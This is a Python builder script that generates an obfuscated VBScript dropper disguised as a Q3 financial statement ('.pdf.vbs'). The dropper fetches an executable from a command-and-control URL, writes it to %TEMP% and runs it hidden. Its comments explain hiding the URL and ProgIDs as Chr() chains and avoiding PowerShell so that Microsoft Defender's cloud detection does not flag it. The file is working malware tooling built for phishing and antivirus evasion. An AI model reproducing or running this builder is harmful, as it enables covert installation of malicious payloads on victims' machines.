#!/usr/bin/env python3
# make_vbs.py - build an obfuscated WSH dropper (.vbs) for the umbra chain.
#
# Why this exists
# ---------------
# The .lnk cradle runs powershell.exe, and Defender cloud ML flags the
# PowerShell command line itself (Trojan:Win32/Commando.AIml) even when the
# beacon binary is clean (loader.exe run directly passes the same EDR). This
# dropper needs NO PowerShell anywhere in the chain:
#
#   double-click .vbs
#     -> wscript.exe (GUI host, no console window)
#        -> MSXML2.XMLHTTP.6.0 GET <url>        (fallback: Microsoft.XMLHTTP)
#        -> ADODB.Stream -> SaveToFile %TEMP%\<rand>.exe
#        -> WScript.Shell.Run "<dropped>", 0, False   (hidden, no wait)
#
# Every identifying string (ProgIDs, %TEMP%, the drop name, the URL) is stored
# as Chr() chains, so the file on disk contains no plaintext "ADODB.Stream",
# "XMLHTTP", the URL or the drop name. The only new detection surface versus a
# plain loader.exe is the script text itself and the wscript download/drop/run
# behaviour.
#
# Design notes
# ------------
# * VarType(responseBody) = 8209 = vbArray + vbByte: guarantees raw bytes
#   before SaveToFile (a 200 with an HTML error page would corrupt the exe).
# * Send errors are checked via Err.Number BEFORE reading x.Status (a failed
#   synchronous request can throw on .Status), and the two status checks are
#   nested Ifs - VBScript And does NOT short-circuit.
# * The dropped name is random 6-char [a-z0-9].exe generated at build time
#   (--seed makes builds reproducible, --exe-name pins it).
# * %TEMP% is expanded at runtime with WshShell.ExpandEnvironmentStrings:
#   ADODB.SaveToFile does NOT expand env vars. The expanded path is quoted
#   with Chr(34) in Run because %TEMP% usually contains spaces.
# * Run style 0 (hidden) + wait=False: the double-clicked wscript.exe exits
#   immediately, no window, nothing on screen, nothing waits.
# * SaveToFile mode 2 (adSaveCreateOverWrite): a repeat double-click
#   overwrites instead of erroring.
#
# Usage:
#   python3 scripts/make_vbs.py --url https://c2.example.com/loader.exe \
#       --name 2026-Q3_Financial_Statement.pdf \
#       --out  dist/2026-Q3_Financial_Statement.pdf.vbs
#   # reproducible drop name:  --seed 2026q3
#   # fixed drop name:         --exe-name reportviewer.exe
#
# Only test against a local/benign payload (see scripts/run.sh vbs tests).

import argparse
import os
import random
import string
import sys


def chr_chain(s):
    """Encode a string as a VBScript Chr() chain: Chr(87)&Chr(115)&..."""
    if any(ord(c) > 255 for c in s):
        raise SystemExit("[-] string has non-ANSI chars, Chr() cannot encode it: %r" % s)
    return "&".join("Chr(%d)" % ord(c) for c in s)


def random_drop_name(rng):
    body = "".join(rng.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    return body + ".exe"


def build_vbs(url, drop_name, doc_id):
    drop_path = "%TEMP%\\" + drop_name
    lines = [
        "' 2026-Q3 Financial Statement viewer",
        "' Document ID: DOC-%s" % doc_id,
        "' Opens the Q3 statement bundle on this workstation.",
        "'",
        "' Generated by the umbra build chain - do not edit by hand.",
        "On Error Resume Next",
        "Dim w, x, s, u, p, d",
        "Set x = Nothing",
        "u = " + chr_chain(url),
        "Set w = CreateObject(" + chr_chain("WScript.Shell") + ")",
        "p = w.ExpandEnvironmentStrings(" + chr_chain(drop_path) + ")",
        "Set x = CreateObject(" + chr_chain("MSXML2.XMLHTTP.6.0") + ")",
        "If Err.Number <> 0 Then",
        "    Err.Clear",
        "    Set x = CreateObject(" + chr_chain("Microsoft.XMLHTTP") + ")",
        "End If",
        "Err.Clear",
        "If Not x Is Nothing Then",
        '    x.Open "GET", u, False',
        "    x.Send",
        "    d = 0",
        "    If Err.Number = 0 Then",
        "        d = x.Status",
        "    End If",
        "    Err.Clear",
        "    If d = 200 Then",
        "        If VarType(x.responseBody) = 8209 Then",
        "            Set s = CreateObject(" + chr_chain("ADODB.Stream") + ")",
        "            s.Type = 1",
        "            s.Open",
        "            s.Write x.responseBody",
        "            s.SaveToFile p, 2",
        "            s.Close",
        "            w.Run Chr(34) & p & Chr(34), 0, False",
        "        End If",
        "    End If",
        "End If",
    ]
    return "\r\n".join(lines) + "\r\n"


def main(argv=None):
    p = argparse.ArgumentParser(
        description="Build an obfuscated WSH dropper (.vbs) - no PowerShell in the chain.")
    p.add_argument("--url", required=True,
                   help="full payload URL, e.g. https://c2.example.com/loader.exe")
    p.add_argument("--name", default="2026-Q3_Financial_Statement.pdf",
                   help="document name the .vbs is named after (default: 2026-Q3_Financial_Statement.pdf)")
    p.add_argument("--out", default=None,
                   help="output path (default: dist/<NAME>.vbs)")
    p.add_argument("--exe-name", default=None,
                   help="fixed dropped exe name (default: random 6-char [a-z0-9].exe)")
    p.add_argument("--seed", default=None,
                   help="seed for the random drop name (reproducible builds)")
    p.add_argument("--doc-id", default="2026-Q3-114",
                   help="fake document id used in the header comments")
    a = p.parse_args(argv)

    if a.seed is not None:
        rng = random.Random(a.seed)
    else:
        rng = random.SystemRandom()
    drop_name = a.exe_name or random_drop_name(rng)

    out = a.out or os.path.join("dist", a.name + ".vbs")
    script = build_vbs(a.url, drop_name, a.doc_id)

    with open(out, "w", newline="") as fh:
        fh.write(script)

    print("[+] wrote %s (%d bytes)" % (out, os.path.getsize(out)))
    print("    url      : %s" % a.url)
    print("    drop     : %%TEMP%%\\%s (expanded at runtime)" % drop_name)
    print("    host     : wscript.exe (double-click) / cscript.exe (console test)")
    print("    plaintext: no URL/ProgID/drop name in the file (all Chr() chains)")
    print("    test     : cscript //nologo %s" % out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
